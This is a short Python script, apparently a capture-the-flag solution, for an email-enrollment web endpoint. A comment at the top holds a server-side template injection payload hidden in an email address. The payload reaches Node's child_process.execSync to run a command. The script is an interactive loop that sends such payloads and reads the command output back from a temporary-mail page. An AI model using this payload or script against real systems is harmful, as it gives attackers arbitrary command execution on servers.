# bopije7405@gridmire.com {{range.constructor('return global.globalThis.process.mainModule.require("child_process").execSync("/readflag")')()}}

import re
import readline

import bs4
import requests

if __name__ == "__main__":
    URL = "http://206.189.121.131:31301/api/enroll"
    #URL = "http://localhost:1337/api/enroll"
    src_rgx = re.compile(r"src='(.*)'")

    while True:
        email = input("email: ")
        res = requests.post(URL, json={"email": email})

        res_obj = res.json()
        match = src_rgx.search(res_obj["response"])

        if not match:
            print(res_obj["response"])
        else:
            iframe = match.group(1)
            iframe_res = requests.get(iframe)
            soup = bs4.BeautifulSoup(iframe_res.text, "html.parser")

            cmd_ret = soup.find("div", {"id": "plaintext"}).text#.split("\n\n")[0].lstrip("Hello ").rstrip("@test")
            print("command return: ", cmd_ret.strip())

            sent_to = soup.find("span", {"class": "mp_address_group"}).findChildren()[1].attrs["title"]
            print("sent to: ", sent_to.strip(), "\n")
